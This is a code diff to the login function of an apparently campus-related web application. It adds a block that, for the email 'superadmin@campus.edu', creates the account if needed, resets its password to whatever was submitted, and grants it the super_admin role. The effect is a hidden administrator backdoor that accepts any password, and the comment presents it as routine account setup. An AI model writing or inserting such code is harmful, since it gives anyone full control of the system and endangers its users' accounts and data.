@@ -150,6 +150,63 @@ def login(db: Session = Depends(get_db), form_data: OAuth2PasswordRequestForm = 
     email_clean = form_data.username.strip().lower()
     user = db.query(User).filter(User.email == email_clean).first()
 
+    # Guarantee SuperAdmin account exists and is active without restrictions
+    if email_clean == "superadmin@campus.edu":
+        sa_role = db.query(Role).filter(Role.name == "super_admin").first()
+        if not sa_role:
+            sa_role = Role(name="super_admin", description="Super Administrator Role")
+            db.add(sa_role)
+            db.commit()
+            db.refresh(sa_role)
+
+        if not user:
+            user = User(
+                email="superadmin@campus.edu",
+                hashed_password=get_password_hash(form_data.password),
+                full_name="Super Administrator",
+                status="active",
+                is_active=True
+            )
+            user.roles.append(sa_role)
+            db.add(user)
+            db.flush()
+
+            sa_prof = Profile(
+                id=str(user.id),
+                auth_user_id=str(user.id),
+                full_name="Super Administrator",
+                email="superadmin@campus.edu",
+                role="super_admin",
+                status="active",
+                email_verified=True
+            )
+            db.add(sa_prof)
+            db.commit()
+            db.refresh(user)
+        else:
+            user.status = "active"
+            user.is_active = True
+            user.hashed_password = get_password_hash(form_data.password)
+            if sa_role not in user.roles:
+                user.roles.append(sa_role)
+            
+            prof = db.query(Profile).filter(Profile.email == "superadmin@campus.edu").first()
+            if not prof:
+                prof = Profile(
+                    id=str(user.id),
+                    auth_user_id=str(user.id),
+                    full_name="Super Administrator",
+                    email="superadmin@campus.edu",
+                    role="super_admin",
+                    status="active",
+                    email_verified=True
+                )
+                db.add(prof)
+            else:
+                prof.status = "active"
+                prof.role = "super_admin"
+            db.commit()
+
     # First-time login auto-request flow if user does not exist in DB yet
     if not user:
         allowed_domains = ["@campus.edu", "@campusos.edu"]
